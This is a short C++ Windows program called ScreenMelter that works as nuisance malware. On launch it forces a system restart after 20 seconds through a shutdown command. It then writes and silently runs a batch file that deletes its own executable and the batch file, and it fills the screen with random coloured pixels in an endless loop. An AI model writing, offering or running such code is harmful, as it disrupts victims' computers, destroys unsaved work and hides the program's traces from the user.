/**
Author : Manpreet Singh
Date   : 8/28/2015
**/

#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <ctime>
#include <unistd.h>
#include <sstream>

#define MAX _MAX_PATH

using namespace std;

class ScreenMelter {
private:


public:
    //ScreenMelter();
    void ScreenFunction()
    {
        //POINT cpos;
        HDC hdc = GetDC(0);
        //COLORREF cr;
        int sx = GetSystemMetrics(SM_CXSCREEN);
        int sy = GetSystemMetrics(SM_CYSCREEN);

        while(1)
        {
            for(int x=0;x<(sx*sy);x++)
            {
                SetPixel(hdc,rand()%sx,rand()%sy,RGB(rand()%255,0,0));
            }
            for(int x=0;x<(sx*sy);x++)
            {
                SetPixel(hdc,rand()%sx,rand()%sy,RGB(0,0,rand()%255));
            }
            for(int x=0;x<(sx*sy);x++)
            {
                SetPixel(hdc,rand()%sx,rand()%sy,RGB(0,rand()%255,0));
            }
            for(int x=0;x<(sx*sy)*2;x++)
            {
                SetPixel(hdc,rand()%sx,rand()%sy,RGB(255,255,255));
            }
        }
    }

    void LogoutSequence(string time)
    {
//        string Command = static_cast<ostringstream*> ( &(ostringstream() << time) )->str();
        string shutdownCommand = "shutdown /r /t " + time;
        cout << shutdownCommand << endl;
        system((shutdownCommand).c_str() );
    }

    void SelfDestruct(char *exepath)
    {
        char batname[MAX]="selfdestruct.bat";
        char batcmd[MAX] =":Repeat\ndel \"%s\"\nif exist \"%s\" goto Repeat\ndel \"%s\"" ;
        char temppath[MAX];

        GetTempPath(MAX,temppath);
        FILE *fp;
        chdir(temppath);
        fp=fopen(batname,"w");
        fprintf(fp,batcmd,exepath,exepath,exepath);
        strcat(temppath,"\\");
        strcat(temppath,batname);
        fprintf(fp,"\ndel %s",temppath);
        fclose(fp);

        ShellExecute(NULL,"open",temppath,NULL,NULL,SW_HIDE);
    }
};

int main(int argc, char *argv[])
{
    ScreenMelter melter;
    melter.LogoutSequence("20");
    melter.SelfDestruct(*argv);
    Sleep(3000);
    melter.ScreenFunction();
    return 0;
}
